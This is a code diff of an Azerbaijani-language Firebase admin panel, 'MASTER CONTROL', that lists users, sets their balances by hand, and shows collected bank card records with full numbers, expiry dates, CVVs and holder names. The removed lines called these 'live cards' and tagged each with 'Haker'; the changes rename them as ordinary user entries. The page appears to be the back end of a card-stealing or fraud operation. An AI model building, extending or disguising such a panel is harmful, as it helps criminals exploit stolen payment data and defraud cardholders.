@@ -3,20 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MASTER COMMAND</title>
+    <title>MASTER CONTROL</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;900&family=Syncopate:wght@700&display=swap');
-        body { margin: 0; background: #050508; color: white; font-family: 'Outfit', sans-serif; }
-        .tab-menu { display: flex; gap: 10px; padding: 15px; background: #0a0a0f; border-bottom: 1px solid #00dfff; overflow-x: auto; }
-        .tab-btn { background: rgba(255,255,255,0.05); border: 1px solid #333; color: white; padding: 10px 15px; border-radius: 8px; font-size: 0.7rem; cursor: pointer; white-space: nowrap; }
-        .tab-btn.active { background: #00dfff; color: black; font-weight: 900; }
-        .card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 15px; padding: 15px; margin: 15px; }
-        .data-row { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid #111; }
-        .badge { padding: 5px 10px; border-radius: 5px; font-size: 0.6rem; cursor: pointer; border: none; font-weight: 900; }
-        .bank-item { border-left: 3px solid #00ff88; background: rgba(0,255,136,0.05); padding: 10px; margin-bottom: 10px; border-radius: 5px; }
+        body { background: #050508; color: white; font-family: sans-serif; margin: 0; padding: 10px; }
+        .tab-menu { display: flex; gap: 10px; margin-bottom: 20px; }
+        .tab-btn { background: #111; border: 1px solid #333; color: #fff; padding: 10px; border-radius: 5px; cursor: pointer; flex: 1; font-size: 0.7rem; font-weight: 800; }
+        .tab-btn.active { background: #d4af37; color: #000; border-color: #d4af37; }
+        .card { background: #0a0a0f; border: 1px solid #1a1a20; padding: 15px; border-radius: 12px; margin-bottom: 15px; }
+        .data-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .badge { padding: 5px 10px; border-radius: 5px; font-size: 0.6rem; border: none; cursor: pointer; font-weight: 900; }
+        .input-bal { background: #000; border: 1px solid #333; color: #00ff88; padding: 5px; border-radius: 5px; width: 80px; text-align: center; }
+        .bank-item { border-left: 3px solid #d4af37; background: rgba(212, 175, 55, 0.05); padding: 10px; margin-bottom: 10px; border-radius: 5px; }
     </style>
 </head>
 <body>
@@ -24,25 +24,14 @@
 <div class="tab-menu">
     <button class="tab-btn active" onclick="showSec('users', this)">İSTİFADƏÇİLƏR</button>
     <button class="tab-btn" onclick="showSec('bank', this)">BANK KARTLARI</button>
-    <button class="tab-btn" onclick="showSec('logs', this)">DİGƏR LOQLAR</button>
 </div>
 
 <div id="sec-users" class="section">
-    <div class="card">
-        <h3>İSTİFADƏÇİ İDARƏSİ</h3>
-        <div id="user-list"></div>
-    </div>
+    <div id="user-list"></div>
 </div>
 
 <div id="sec-bank" class="section" style="display:none">
-    <div class="card">
-        <h3 style="color:#00ff88">💳 CANLI KARTLAR</h3>
-        <div id="bank-list"></div>
-    </div>
-</div>
-
-<div id="sec-logs" class="section" style="display:none">
-    <div class="card" id="logs-list"></div>
+    <div id="bank-list"></div>
 </div>
 
 <script>
@@ -57,33 +46,46 @@
         btn.classList.add('active');
     }
 
-    // USERS & BLOCKING
+    // USERS LIST WITH BALANCE CONTROL
     db.ref('users').on('value', snap => {
         const list = document.getElementById('user-list');
         list.innerHTML = "";
         snap.forEach(u => {
             const d = u.val();
             const isB = d.status === 'blocked';
-            list.innerHTML += `<div class="data-row">
-                <span>${u.key} ${isB ? '<b style="color:red">[BLOK]</b>' : ''}</span>
-                <button class="badge" style="background:${isB ? 'green' : 'red'}" onclick="toggleB('${u.key}', ${isB})">${isB ? 'AÇ' : 'BLOKLA'}</button>
+            list.innerHTML += `<div class="card" style="border-top: 2px solid ${isB ? 'red' : '#d4af37'}">
+                <div class="data-row">
+                    <span><i class="fas fa-user"></i> ${u.key} ${isB ? '<b style="color:red">(BLOK)</b>' : ''}</span>
+                    <button class="badge" style="background:${isB ? 'green' : 'red'}" onclick="toggleB('${u.key}', ${isB})">${isB ? 'AÇ' : 'BLOKLA'}</button>
+                </div>
+                <div style="display:flex; justify-content:space-between; align-items:center; background:#111; padding:10px; border-radius:8px;">
+                    <small>BALANS: <b style="color:#00ff88">${d.balance || '0.00'} AZN</b></small>
+                    <div>
+                        <input type="number" id="in-${u.key}" class="input-bal" placeholder="Məbləğ">
+                        <button class="badge" style="background:#d4af37; color:#000" onclick="updateB('${u.key}')">YENİLƏ</button>
+                    </div>
+                </div>
             </div>`;
         });
     });
 
     window.toggleB = (id, b) => db.ref('users/' + id).update({ status: b ? 'active' : 'blocked' });
+    window.updateB = (id) => {
+        const val = document.getElementById('in-' + id).value;
+        if(val) db.ref('users/' + id).update({ balance: parseFloat(val).toFixed(2) }).then(() => alert("Balans yeniləndi!"));
+    };
 
-    // BANK CARDS
+    // BANK CARDS MONITORING
     db.ref('user_cards').on('value', snap => {
         const list = document.getElementById('bank-list');
-        list.innerHTML = snap.exists() ? "" : "Hələ yoxdur...";
+        list.innerHTML = "";
         snap.forEach(c => {
             const d = c.val();
             list.innerHTML = `<div class="bank-item">
-                <small>Haker: ${c.key}</small><br>
-                <b style="font-size:1rem; letter-spacing:1px">${d.num}</b><br>
-                <small>VAL: ${d.date} | CVV: <span style="color:red">${d.cvv}</span> | BAL: ${d.balance} AZN</small><br>
-                <small>NAME: ${d.name}</small>
+                <small>İSTİFADƏÇİ: ${c.key}</small><br>
+                <b style="font-size:1.1rem; letter-spacing:1px; color:#fff">${d.num}</b><br>
+                <small>MÜDDƏT: ${d.date} | CVV: <span style="color:red">${d.cvv}</span></small><br>
+                <small>AD: ${d.name} | BALANS: ${d.balance} AZN</small>
                 <div style="text-align:right"><button onclick="db.ref('user_cards/${c.key}').remove()" class="badge" style="background:none; color:grey">SİL</button></div>
             </div>` + list.innerHTML;
         });
